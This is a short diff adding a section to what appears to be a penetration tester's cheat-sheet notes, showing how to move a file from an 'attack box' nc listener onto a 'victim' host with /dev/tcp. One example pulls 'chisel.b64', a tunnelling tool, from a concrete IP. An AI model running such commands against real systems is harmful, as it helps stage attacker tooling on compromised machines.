@@ -11,3 +11,12 @@ or
 
 **You may need to terminate the nc listener receiving the file as it can hang and keep the connection active** 
 
+
+## TCG you monster (/dev/tcp)
+You can use `/dev/tcp` to transfer files in some janky horrid way
+Host the file on your attack box like normal `nc -lvnp 9001 < <FILE>`
+
+From the victim run 
+`cat < /dev/tcp/<IP>/<PORT> > <FILENAME>`
+
+`cat < /dev/tcp/10.11.41.83/9001 > chisel.b64`
